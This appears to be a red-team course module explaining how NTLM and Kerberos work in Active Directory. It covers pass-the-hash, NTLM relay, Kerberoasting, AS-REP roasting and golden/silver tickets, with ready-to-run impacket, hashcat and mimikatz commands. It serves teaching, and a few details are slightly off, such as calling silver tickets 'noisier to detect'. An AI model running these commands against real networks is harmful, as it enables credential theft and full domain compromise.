# 02 — AD Authentication (NTLM & Kerberos)

> **Module:** Active Directory
> **Difficulty:** Intermediate
> **RTO Relevance:** Critical — Authentication weaknesses are the core of most AD attacks

---

## Why Authentication Matters to an RTO

When `ali.hassan` logs into his workstation, the Domain Controller must verify his identity. This verification process uses one of two protocols — **NTLM** or **Kerberos**. Both have fundamental weaknesses that Red Team Operators exploit to move laterally, escalate privileges, and maintain persistent access.

---

## NTLM — The Legacy Protocol

### What is NTLM?

NTLM (NT LAN Manager) is an older challenge-response authentication protocol. The critical design point: **the actual password never travels over the network** — only a hash of it does.

### How NTLM Works — Step by Step

```
ali.hassan wants to access \\FILE-SERVER

Step 1 — Negotiation
ali.hassan's PC → FILE-SERVER: "I want to authenticate"

Step 2 — Challenge
FILE-SERVER → ali.hassan's PC: "Here is a random number (challenge): A4F3B2..."

Step 3 — Response
ali.hassan's PC takes:
    password hash + challenge number
    → runs them through an algorithm
    → produces a response hash
ali.hassan's PC → FILE-SERVER: sends response hash

Step 4 — Verification
FILE-SERVER → DC: "Verify this response for ali.hassan"
DC checks its stored hash, runs same calculation
If results match → Access granted ✅
If not → Access denied ❌
```

### NTLM Ports

| Port | Protocol | Usage |
|------|----------|-------|
| TCP 445 | SMB | Primary NTLM over SMB |
| TCP 139 | NetBIOS | Legacy NTLM |

---

## NTLM Attacks

### Attack 1 — Pass-the-Hash (PtH)

The most powerful NTLM attack. Since the hash IS the authentication material, you don't need the plaintext password:

```
Attacker captures ali.hassan's NTLM hash
(via Mimikatz, Responder, or memory dump)
        ↓
Hash: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117...
        ↓
Use hash directly to authenticate — no cracking needed
        ↓
impacket-psexec ali.hassan@192.168.1.50 -hashes aad3b435:8846f7ea
        ↓
Shell on FILE-SERVER as ali.hassan ✅
```

### Attack 2 — NTLM Relay

Instead of cracking, relay the authentication to another machine:

```
Step 1: Attacker sets up relay listener (ntlmrelayx)

Step 2: Victim PC sends NTLM auth request
(triggered by phishing, LLMNR poisoning, etc.)

Step 3: Attacker intercepts the authentication

Step 4: Attacker relays it to a different target machine

Step 5: Target machine thinks the victim authenticated directly
        → Grants access to attacker

Result: Access to machine without any credentials or cracking
```

```bash
# Setup NTLM relay attack
ntlmrelayx.py -tf targets.txt -smb2support
```

### NTLM Weaknesses Summary

| Weakness | Attack |
|---------|--------|
| Hash = password equivalent | Pass-the-Hash |
| No mutual authentication | NTLM Relay |
| Weak hash algorithm | Offline cracking |
| Broadcast protocols trigger it | LLMNR Poisoning → Hash capture |

---

## Kerberos — The Modern Protocol

### What is Kerberos?

Kerberos is a **ticket-based authentication protocol** used by modern Active Directory environments. Named after the three-headed dog guarding Hades — appropriately, it has three components.

**Port:** UDP/TCP 88

### The Three Key Components

| Component | Full Name | Role |
|-----------|-----------|------|
| AS | Authentication Server | Issues the master ticket (TGT) |
| TGS | Ticket Granting Service | Issues service-specific tickets |
| SS | Service Server | The actual resource being accessed |

> **Note:** AS and TGS are both part of the **KDC (Key Distribution Center)**, which runs on the Domain Controller.

### Real-World Kerberos Flow — TechCorp Example

**Scene:** Ali Hassan arrives at office Monday morning

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
STAGE 1 — Getting the Master Ticket (TGT)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ali.hassan logs into PC
        ↓
PC → AS (DC): "I am ali.hassan — here is my encrypted identity"
        ↓
AS checks AD database: "Yes, ali.hassan exists, password matches"
        ↓
AS → PC: TGT (Ticket Granting Ticket)
    - Contains: ali.hassan's identity
    - Time-stamped: 9:00 AM Monday
    - Expires: 7:00 PM Monday (10 hours default)
    - Encrypted with KDC's secret key
        ↓
TGT saved on ali.hassan's workstation
(Ali doesn't even see this happen — it's automatic)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
STAGE 2 — Accessing File Server
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Ali opens File Explorer → types \\files.techcorp.local
        ↓
PC → TGS: "I have my TGT. I need access to:
           SPN: CIFS/files.techcorp.local"
        ↓
TGS validates TGT:
    ✅ TGT is valid
    ✅ Not expired
    ✅ ali.hassan has permission to access file server
        ↓
TGS → PC: Service Ticket (for files.techcorp.local only)
        ↓
PC → File Server: presents Service Ticket
        ↓
File Server validates ticket → Access granted ✅

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
STAGE 3 — Accessing Email Server (Same Day)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Ali opens Outlook → connects to mail.techcorp.local
        ↓
PC uses SAME TGT from this morning
        ↓
New Service Ticket requested for: SMTP/mail.techcorp.local
        ↓
Email access granted ✅
(Ali never re-entered his password — TGT handled it all)
```

### SPN (Service Principal Name)

Every service registered in AD has a unique identifier called an SPN:

```
Format: ServiceType/hostname.domain
Examples:
    CIFS/files.techcorp.local      ← File server
    SMTP/mail.techcorp.local       ← Mail server
    MSSQL/db.techcorp.local        ← Database server
    HTTP/webapp.techcorp.local     ← Web application
    HOST/pc-khi-01.techcorp.local  ← Workstation
```

> **RTO Note:** SPNs are the foundation of Kerberoasting attacks.

---

## Kerberos Attacks

### Attack 1 — Kerberoasting

Any authenticated domain user can request a Service Ticket for any SPN. The ticket is encrypted with the **service account's password hash**. Take the ticket offline and crack it:

```
Step 1: Find accounts with SPNs (service accounts)
        ldapsearch or PowerView: Get-SPN

Step 2: Request their Service Ticket
        (completely normal — any user can do this)

Step 3: Extract the ticket (it's encrypted with service account hash)

Step 4: Take ticket offline — crack with Hashcat
        hashcat -m 13100 ticket.hash rockyou.txt

Step 5: Plaintext password of service account recovered

Why this works:
Service accounts often have:
    - Weak passwords (set years ago, never changed)
    - High privileges (local admin on many machines)
    - No password expiry
```

### Attack 2 — AS-REP Roasting

Some accounts have **"Do not require Kerberos pre-authentication"** enabled. This is a misconfiguration that allows requesting encrypted data for that user without knowing their password:

```
Step 1: Find accounts with pre-auth disabled
        GetNPUsers.py techcorp.local/ -usersfile users.txt

Step 2: Request AS-REP hash (no password needed)

Step 3: Crack offline with Hashcat
        hashcat -m 18200 asrep.hash rockyou.txt

Step 4: Plaintext password recovered
```

### Attack 3 — Golden Ticket

The most powerful Kerberos attack — requires DC compromise first:

```
Prerequisite: Obtain KRBTGT account's NTLM hash
(from NTDS.dit dump or DCSync attack)

Step 1: Extract KRBTGT hash
        Domain SID: S-1-5-21-3623811015-3361044348-...
        KRBTGT hash: 8846f7eaee8fb117ad06bdd830b7586c

Step 2: Forge a Golden Ticket (fake TGT)
        mimikatz: kerberos::golden /user:administrator
                  /domain:techcorp.local /sid:S-1-5-21-...
                  /krbtgt:8846f7eaee8fb117...
                  /endin:87600    ← Valid for 10 years

Step 3: Use the ticket
        → Authenticate as ANY user
        → Access ANY resource in the domain
        → Even if real passwords are changed
        → Ticket remains valid until KRBTGT password changed TWICE
```

### Attack 4 — Silver Ticket

Similar to Golden Ticket but targets a **specific service** rather than the whole domain:

```
Requires: Service account's NTLM hash (not KRBTGT)
Effect: Forge Service Ticket for one specific service
Advantage: Noisier to detect than Golden Ticket
            (doesn't contact DC — offline forgery)
```

---

## NTLM vs Kerberos — Complete Comparison

| Feature | NTLM | Kerberos |
|---------|------|----------|
| Type | Challenge-Response | Ticket-Based |
| Protocol Age | Old | Modern |
| Port | TCP 445 | UDP/TCP 88 |
| Password travels? | Never (hash only) | Never (ticket only) |
| DC contacted per resource? | Yes | No (ticket reused) |
| Main Attack | Pass-the-Hash, Relay | Kerberoasting, Golden Ticket |
| When used | Workgroups, old systems, fallback | Modern AD environments |
| Encryption | Weak (MD4) | Strong (AES-256) |

---

## Key Takeaways

- NTLM = Challenge-Response, hash-based, legacy protocol
- Kerberos = Ticket-based, modern, used in all current AD environments
- **Pass-the-Hash:** Use captured NTLM hash directly — no cracking needed
- **NTLM Relay:** Intercept auth and relay to another machine
- **Kerberoasting:** Request service tickets, crack offline → service account passwords
- **AS-REP Roasting:** Target accounts with pre-auth disabled
- **Golden Ticket:** Forge TGTs using KRBTGT hash → permanent domain access
- Kerberos port: **UDP/TCP 88** — seeing this open = Domain Controller confirmed

---
